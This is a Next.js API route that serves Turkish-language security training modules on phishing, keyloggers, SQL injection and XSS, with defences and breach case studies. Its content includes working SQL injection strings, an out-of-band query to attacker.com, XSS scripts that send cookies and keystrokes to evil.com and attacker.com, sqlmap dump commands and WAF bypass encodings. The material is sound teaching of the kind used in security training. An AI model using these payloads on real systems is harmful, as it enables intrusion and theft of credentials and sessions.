import { NextResponse } from "next/server";

const MODULES = {
  phishing: {
    title: "Phishing & Social Engineering",
    sections: [
      {
        id: "what-is-phishing",
        title: "Phishing Nedir?",
        content: `# Phishing Nedir?

Phishing, saldırganların güvenilir bir kurum veya kişi gibi davranarak kurbanlardan hassas bilgi çalmaya çalıştığı sosyal mühendislik saldırısıdır.

## Temel Teknikler

### 1. Email Spoofing
Saldırgan, gönderen adresini taklit eder:
\`\`\`
From: security@paypa1.com     ← sahte (1 ile l karıştırılmış)
From: noreply@bank-secure.ru  ← şüpheli TLD
From: support@amaz0n.com      ← homograf saldırısı
\`\`\`

### 2. HTML Email Manipülasyonu
\`\`\`html
<!-- Görünen link farklı, gerçek hedef farklı -->
<a href="http://evil-site.ru/steal">
  https://paypal.com/login  ← kullanıcı bunu görür
</a>
\`\`\`

### 3. SPF/DKIM/DMARC Bypass
Email sunucuları sahte göndericiyi tespit etmek için bu protokolleri kullanır:
- **SPF**: Hangi IP'lerin bu domain adına email gönderebileceğini belirtir
- **DKIM**: Email içeriğinin imzalanması
- **DMARC**: SPF ve DKIM politikalarının uygulanması

Zayıf yapılandırılmış domainler bu kontrolleri geçebilir.

## Spear Phishing
Hedefe özel hazırlanmış phishing. Saldırgan önce OSINT yapar:
- LinkedIn'den iş pozisyonu öğrenir
- Sosyal medyadan ilgi alanları tespit eder
- Şirket içi dil ve formatı kopyalar

## Araçlar (Savunma Amaçlı Test)
- **GoPhish**: Açık kaynak phishing simülasyon platformu
- **King Phisher**: Phishing kampanya yönetimi
- **SET (Social Engineering Toolkit)**: Metasploit ile entegre

## Savunma
1. Email gateway filtreleme (Proofpoint, Mimecast)
2. SPF/DKIM/DMARC yapılandırması
3. Kullanıcı farkındalık eğitimi
4. MFA zorunluluğu
5. Zero-trust email politikası`
      },
      {
        id: "phishing-tools",
        title: "Teknik Araçlar ve Analiz",
        content: `# Phishing Teknik Analizi

## Email Header Analizi
Bir phishing emailinin header'ı incelendiğinde:
\`\`\`
Received: from evil-server.ru (evil-server.ru [185.220.101.x])
X-Originating-IP: 185.220.101.45
Authentication-Results: spf=fail; dkim=none; dmarc=fail
\`\`\`

SPF fail + DKIM none + DMARC fail = Kesinlikle sahte

## URL Analizi
Şüpheli URL'leri analiz etmek için:
\`\`\`bash
# URLScan.io API ile analiz
curl "https://urlscan.io/api/v1/scan/" \\
  -H "Content-Type: application/json" \\
  -d '{"url": "https://şüpheli-site.com"}'

# VirusTotal ile kontrol
# https://www.virustotal.com/gui/url/[url-hash]
\`\`\`

## Phishing Kit Anatomisi
Saldırganlar hazır phishing kit kullanır:
\`\`\`
phishing-kit/
├── index.php          # Sahte login sayfası
├── submit.php         # Çalınan verileri toplar
├── redirect.php       # Gerçek siteye yönlendirir
├── logs/              # Çalınan credential'lar
│   └── results.txt
└── .htaccess          # Bot/araştırmacı engelleme
\`\`\`

## Gerçek Dünya: 2020 Twitter Hack
- **Vektör**: Spear phishing telefon araması
- **Hedef**: Twitter IT çalışanları
- **Yöntem**: Sahte IT destek araması ile VPN credential'ları çalındı
- **Sonuç**: Obama, Musk, Gates hesapları ele geçirildi
- **Zarar**: Bitcoin dolandırıcılığıyla $120,000 çalındı

## Defensive Tools
- **PhishTank**: Phishing URL veritabanı
- **OpenDNS**: DNS seviyesinde phishing engelleme  
- **DMARC Analyzer**: Email güvenlik analizi`
      }
    ]
  },
  keylogger: {
    title: "Keylogger: Teknik Analiz",
    sections: [
      {
        id: "keylogger-how",
        title: "Keylogger Nasıl Çalışır?",
        content: `# Keylogger Teknik Analizi

## Keylogger Türleri

### 1. User-Mode Keylogger (En Yaygın)
Windows API hook'ları kullanır:
\`\`\`python
# Python ile eğitim amaçlı keylogger mekaniği
# (Bu kod sisteminizde ÇALIŞMAZ - sadece kavramsal gösterim)

import ctypes

# Windows SetWindowsHookEx API
# WH_KEYBOARD_LL = 13 (low-level keyboard hook)
# Bu hook tüm klavye girdilerini yakalar
# Kernel'e değil, user-space'e erişir

# Nasıl çalışır:
# 1. SetWindowsHookEx(WH_KEYBOARD_LL, callback, NULL, 0)
# 2. Her tuş vuruşunda callback fonksiyonu tetiklenir
# 3. CallNextHookEx ile normal akışa devam edilir
# 4. Log dosyasına veya uzak sunucuya gönderilir
\`\`\`

### 2. Kernel-Mode Keylogger (En Tehlikeli)
- Device driver olarak çalışır
- Ring 0 erişimi - antivirüs göremez
- Rootkit teknikleri kullanır
- Windows Driver Kit (WDK) ile yazılır

### 3. Hypervisor-Based Keylogger
- Sanal makine seviyesinde çalışır
- İşletim sistemi tamamen kandırılır
- Blue Pill gibi teknikler

### 4. Hardware Keylogger
- Fiziksel USB/PS2 arası cihaz
- Yazılım taraması tamamen işe yaramaz
- KeyGrabber, KeyCarbon gibi ürünler
- 8GB depolama, WiFi ile veri aktarımı

## Keylogger Yazılım Mimarisi
\`\`\`
[Klavye] → [OS Kernel] → [Hook DLL] → [Buffer]
                                           ↓
                                    [Şifreleme]
                                           ↓
                                  [C2 Sunucu / Log Dosyası]
\`\`\`

## Tespit Yöntemleri
\`\`\`bash
# Windows'ta şüpheli hook'ları listele
# Process Hacker ile kernel hook'ları görüntüle

# Autoruns ile başlangıç programlarını tara
# Şüpheli DLL injection'ları tespit et

# Network trafiğini izle
# Bilinmeyen IP'lere giden şifreli trafik
# Port 443 üzerinde olağandışı bağlantılar
\`\`\`

## Savunma Katmanları
1. **FIDO2 Hardware Key** - Tuş vuruşu gerektirmez
2. **Virtual Keyboard** - Ekran klavyesi (sınırlı koruma)
3. **Anti-keylogger yazılımı** - KeyScrambler, Zemana
4. **EDR çözümleri** - CrowdStrike, SentinelOne
5. **Davranış analizi** - Olağandışı API çağrıları tespiti

## Gerçek Vaka: Zeus Banking Trojan
- 2007-2010 yılları arası aktif
- Keylogger + form grabber kombinasyonu
- 3.6 milyon Windows sistemi enfekte
- $100 milyon+ banka dolandırıcılığı
- Bugün hala türevleri aktif (Zbot, GameOver Zeus)`
      }
    ]
  },
  sql: {
    title: "SQL Injection: Tam Teknik Rehber",
    sections: [
      {
        id: "sql-basics",
        title: "SQL Injection Mekanizması",
        content: `# SQL Injection Teknik Rehber

## Temel Mekanizma

### Savunmasız Kod Örneği
\`\`\`python
# YANLIŞ - Savunmasız
def get_user(username):
    query = "SELECT * FROM users WHERE username='" + username + "'"
    return db.execute(query)

# Kullanıcı girişi: admin' --
# Oluşan sorgu:
# SELECT * FROM users WHERE username='admin' --'
# -- işareti sonrasını yorum yapar → şifre kontrolü atlanır
\`\`\`

\`\`\`python
# DOĞRU - Güvenli
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,))
    # Kullanıcı girdisi asla SQL kodu olarak yorumlanamaz
\`\`\`

## SQL Injection Türleri

### 1. Classic (In-band) SQLi
\`\`\`sql
-- Union-based: Veri doğrudan döndürülür
' UNION SELECT username, password FROM users --

-- Error-based: Hata mesajından veri sızar
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
\`\`\`

### 2. Blind SQLi
\`\`\`sql
-- Boolean-based: True/False ile veri çıkarılır
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --

-- Time-based: Gecikme ile veri çıkarılır  
'; IF (1=1) WAITFOR DELAY '0:0:5' --
-- Sayfa 5 saniye geç yüklenirse → koşul doğru
\`\`\`

### 3. Out-of-band SQLi
\`\`\`sql
-- DNS kanalı üzerinden veri sızdırma
'; exec master..xp_dirtree '//attacker.com/'+@@version --
\`\`\`

## SQLMap Kullanımı (Etik Test)
\`\`\`bash
# Temel tarama
sqlmap -u "https://hedef.com/page?id=1"

# Veritabanlarını listele
sqlmap -u "https://hedef.com/page?id=1" --dbs

# Tabloları listele
sqlmap -u "https://hedef.com/page?id=1" -D veritabani --tables

# Veri çek
sqlmap -u "https://hedef.com/page?id=1" -D veritabani -T users --dump

# NOT: Sadece izin verilen sistemlerde kullanın!
\`\`\`

## WAF Bypass Teknikleri (Savunma için Bilinmesi Gereken)
\`\`\`sql
-- Büyük/küçük harf karışımı
SeLeCt * FrOm users

-- Yorum ekleme
SE/*comment*/LECT * FROM users

-- URL encoding
%53%45%4C%45%43%54 = SELECT

-- Double encoding
%2553%2545%254C%2545%2543%2554
\`\`\`

## Gerçek Vaka: 2009 Heartland Breach
- **Yöntem**: SQL injection ile iç ağa sızdı
- **Zarar**: 130 milyon kredi kartı çalındı
- **Maliyet**: $140 milyon tazminat
- **Saldırgan**: Albert Gonzalez - 20 yıl hapis`
      }
    ]
  },
  xss: {
    title: "XSS: Cross-Site Scripting",
    sections: [
      {
        id: "xss-basics",
        title: "XSS Tam Teknik Rehber",
        content: `# Cross-Site Scripting (XSS)

## XSS Nedir?
Saldırganın kötü niyetli JavaScript kodunu kurbanın tarayıcısında çalıştırmasıdır.

## XSS Türleri

### 1. Reflected XSS
\`\`\`html
<!-- Savunmasız URL -->
https://site.com/search?q=<script>alert('XSS')</script>

<!-- Sunucu bunu doğrudan sayfaya yazar -->
<p>Arama sonucu: <script>alert('XSS')</script></p>
\`\`\`

### 2. Stored (Persistent) XSS - En Tehlikeli
\`\`\`javascript
// Saldırgan yorum bölümüne şunu yazar:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
// Bu yorum veritabanına kaydedilir
// Her kullanıcı sayfayı açtığında cookie çalınır
\`\`\`

### 3. DOM-based XSS
\`\`\`javascript
// Savunmasız kod:
document.innerHTML = location.hash.substring(1);

// Saldırı URL'si:
https://site.com/page#<img src=x onerror=alert(1)>
// Sunucu hiç dahil olmaz, tamamen client-side
\`\`\`

## Gerçek XSS Payload'ları
\`\`\`javascript
// Cookie çalma
<script>new Image().src="http://evil.com/c?"+document.cookie</script>

// Keylogger (sayfa içinde)
<script>
document.onkeypress = function(e) {
  fetch('http://evil.com/log?k=' + e.key);
}
</script>

// Session hijacking
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'http://evil.com/?c=' + document.cookie);
  x.send();
</script>
\`\`\`

## Savunma
\`\`\`javascript
// 1. Output encoding
const safe = userInput
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;');

// 2. Content Security Policy (CSP) Header
Content-Security-Policy: default-src 'self'; script-src 'self'

// 3. HttpOnly Cookie - JS erişimini engeller
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// 4. DOMPurify kütüphanesi
const clean = DOMPurify.sanitize(dirtyHTML);
\`\`\`

## Araçlar
- **Burp Suite**: XSS tarama ve exploitation
- **XSStrike**: Gelişmiş XSS tespit aracı
- **OWASP ZAP**: Otomatik XSS tarayıcı

## Gerçek Vaka: 2018 British Airways
- Stored XSS ile ödeme sayfasına script enjekte edildi
- 500,000 müşterinin kredi kartı çalındı
- GDPR kapsamında £183 milyon ceza`
      }
    ]
  }
};

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const category = searchParams.get("category") || "phishing";

  const module = MODULES[category as keyof typeof MODULES];
  if (!module) {
    return NextResponse.json({ error: "Module not found" }, { status: 404 });
  }

  return NextResponse.json({ module });
}